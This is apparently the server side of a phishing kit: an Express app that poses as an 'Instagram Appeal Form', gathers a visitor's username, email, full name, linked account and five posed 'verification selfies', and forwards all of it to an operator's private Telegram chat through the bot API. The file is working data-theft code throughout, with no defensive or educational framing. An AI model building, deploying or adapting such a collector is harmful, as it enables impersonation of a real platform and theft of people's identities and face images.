const express = require('express');
const multer = require('multer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot token & chat ID (Render environment variables se)
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('❌ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set!');
}

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Multer setup - memory storage (buffer)
const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB max
});

// ---------- API Routes ----------

// 1. Form data submit (text)
app.post('/api/submit-form', (req, res) => {
  const { type, username, email, fullname, alternative, relationship } = req.body;
  const message = `📋 <b>Instagram Appeal Form</b>\n\n<b>Type:</b> ${type}\n━━━━━━━━━━━━━━━━━━━━\n<b>👤 Username:</b> ${username}\n<b>📧 Email:</b> ${email}\n<b>📝 Name:</b> ${fullname}\n<b>🔗 Alt Account:</b> ${alternative || 'N/A'}\n<b>👥 Relationship:</b> ${relationship}\n━━━━━━━━━━━━━━━━━━━━\n<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
  
  sendTelegramMessage(message)
    .then(() => res.json({ success: true }))
    .catch(err => {
      console.error('Form send error:', err);
      res.status(500).json({ error: 'Failed to send form' });
    });
});

// 2. Selfie upload (photo)
app.post('/api/submit-selfie', upload.single('photo'), (req, res) => {
  console.log('📸 Selfie request received');
  console.log('Body:', req.body);
  console.log('File:', req.file ? 'File present' : 'No file');

  if (!req.file) {
    console.log('❌ No file in request');
    return res.status(400).json({ error: 'No photo uploaded' });
  }

  const { username, formType, poseText, poseNumber } = req.body;
  const caption = `📸 <b>Verification Selfie ${poseNumber}/5</b>\n\n<b>👤 User:</b> ${username}\n<b>📝 Pose:</b> ${poseText}\n<b>📋 Type:</b> ${formType}\n<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

  sendTelegramPhoto(req.file.buffer, caption)
    .then(() => {
      console.log('✅ Photo sent to Telegram');
      res.json({ success: true });
    })
    .catch(err => {
      console.error('❌ Telegram photo error:', err);
      res.status(500).json({ error: 'Failed to send photo' });
    });
});

// 3. Verification complete
app.post('/api/verification-complete', (req, res) => {
  const { username, email, fullname, formType } = req.body;
  const message = `✅ <b>VERIFICATION COMPLETED</b>\n\n<b>👤 User:</b> ${username}\n<b>📧 Email:</b> ${email}\n<b>📝 Name:</b> ${fullname}\n<b>📋 Form:</b> ${formType}\n<b>📸 Photos:</b> 5/5\n<b>✓ Status:</b> Ready for Review\n<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
  
  sendTelegramMessage(message)
    .then(() => res.json({ success: true }))
    .catch(err => {
      console.error('Complete error:', err);
      res.status(500).json({ error: 'Failed' });
    });
});

// ---------- Telegram Helper Functions (built-in fetch) ----------
async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
      chat_id: CHAT_ID, 
      text, 
      parse_mode: 'HTML' 
    })
  });
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Telegram sendMessage failed: ${errorText}`);
  }
  return response.json();
}

async function sendTelegramPhoto(buffer, caption) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('photo', buffer, { filename: 'selfie.jpg' }); // ✅ Buffer directly
  formData.append('caption', caption);
  formData.append('parse_mode', 'HTML');

  const response = await fetch(url, {
    method: 'POST',
    body: formData
  });

  if (!response.ok) {
    const errorText = await response.text();
    console.error('Telegram API Error:', errorText);
    throw new Error(`Telegram sendPhoto failed: ${errorText}`);
  }
  return response.json();
}

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`📸 Bot token: ${BOT_TOKEN ? 'Set' : 'Not set'}`);
  console.log(`📱 Chat ID: ${CHAT_ID ? 'Set' : 'Not set'}`);
});
